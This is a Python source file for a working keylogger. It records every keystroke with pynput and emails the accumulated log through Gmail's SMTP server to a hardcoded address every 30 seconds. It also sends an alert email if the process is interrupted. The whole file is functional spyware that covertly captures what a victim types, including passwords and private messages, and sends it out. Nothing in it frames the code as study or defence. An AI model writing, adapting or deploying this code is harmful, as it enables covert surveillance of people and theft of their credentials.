import smtplib
import threading
from pynput import keyboard
import signal
import sys
import atexit

# --- Email sending function ---
def send_mail(email, password, message):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        print("Log sent successfully.")
    except Exception as e:
        print(f"Error sending email: {e}")

# --- Keylogger class ---
class Keylogger:
    def __init__(self, time_interval: int, email: str, password: str) -> None:
        self.interval = time_interval
        self.log = "KeyLogger has started>>>"
        self.email = email
        self.password = password

    def append_to_log(self, string):
        assert isinstance(string, str)
        self.log += string

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program>>>")
                return False
            else:
                current_key = " [" + str(key) + "] "
        self.append_to_log(current_key)

    def report_n_send(self):
        send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.daemon = True  # Allow process to exit even if timer is running
        timer.start()

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()  # Non-blocking
        self.report_n_send()
        listener.join()  # Optional: wait for listener to finish

# --- Power-loss or unexpected termination alert ---
def on_shutdown():
    send_mail(
        'catherinearthur0514@gmail.com',
        'password_code',
        "KeyLogger interrupted due to power loss"
    )
def handle_signal(sig, frame):
    print("Shutdown signal detected!")
    on_shutdown() 
    sys.exit(0)

# Register signal and exit handlers
signal.signal(signal.SIGINT, handle_signal)
signal.signal(signal.SIGTERM, handle_signal)
atexit.register(on_shutdown)

# --- Main ---
if __name__ == "__main__":
        keylogger = Keylogger(30, 'catherinearthur0514@gmail.com', 'password_code')
        keylogger.start()